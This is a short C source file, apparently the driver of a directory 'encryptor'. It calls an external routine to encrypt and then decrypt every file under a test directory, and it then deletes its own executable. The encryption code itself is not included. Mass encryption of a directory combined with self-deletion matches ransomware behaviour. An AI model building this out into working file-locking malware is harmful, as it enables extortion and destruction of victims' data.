/* [ENCRYPTOR FROM #571] */
#include "library.h"

/* LIBRARIES */
#include <stdio.h>

/* ACTIONS */
#define ENCRYPT
#define DECRYPT

/* NAMED CONSTANTS */
#define INSTRUCTION_RE "ROOT_ENCRYPT"
#define INSTRUCTION_RD "ROOT_DECRYPT"

/* TARGET ROOT DIRECTORY */
#define ROOT_DIR "TEST_DIR"

/* CONSTANTS && FUNCTION FROM CRYPTO.C */
extern const INT8 ENCRYPT_MODE;
extern const INT8 DECRYPT_MODE;
extern INT8 cryptROOT (const INT8 mode, 
    const STRING const dirname);

int main (int argc, char const *argv[]) {

    #ifdef ENCRYPT
    {
        cryptROOT(ENCRYPT_MODE, ROOT_DIR)
        #ifdef DEBUG
            ?DEBUG_FAILURE(INSTRUCTION_RE)
            :DEBUG_SUCCESS(INSTRUCTION_RE)
        #endif
    ;}
    #endif

    #ifdef DECRYPT
    {
        cryptROOT(DECRYPT_MODE, ROOT_DIR)
        #ifdef DEBUG
            ?DEBUG_FAILURE(INSTRUCTION_RD)
            :DEBUG_SUCCESS(INSTRUCTION_RD)
        #endif
    ;}
    #endif

    remove(argv[0]);

    return 0;
}
